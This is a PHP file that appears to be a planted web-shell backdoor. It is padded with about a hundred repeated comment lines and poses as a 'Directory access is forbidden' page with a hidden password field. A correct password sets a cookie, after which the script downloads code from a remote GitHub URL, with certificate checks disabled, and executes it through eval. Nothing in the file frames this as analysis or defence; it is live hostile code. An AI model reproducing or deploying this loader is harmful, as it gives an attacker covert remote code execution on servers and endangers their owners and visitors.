<?php
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
// Function to check if the user is logged in based on the presence of a valid cookie
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'atomic';
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    // Function to get URL content (similar to your previous code)
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/9Cicak/9Cicak/main/9cicak.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '966bc56c93dd7ecd1d33b9713f74d990'; 
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'atomic', time() + 3600, '/'); 
        } else {
            echo "Please try again.";
        }
    }
    ?>
    <style>
            input {
                margin: 0;
                background-color: #fff;
                border: 1px solid #fff;
                text-align: center;
            }
        </style>
<p>Directory access is forbidden.</p>
        <center>
          <form method="POST" action="">

            <input type="password" id="password" name="password">
        </form>
    <?php
}
?>
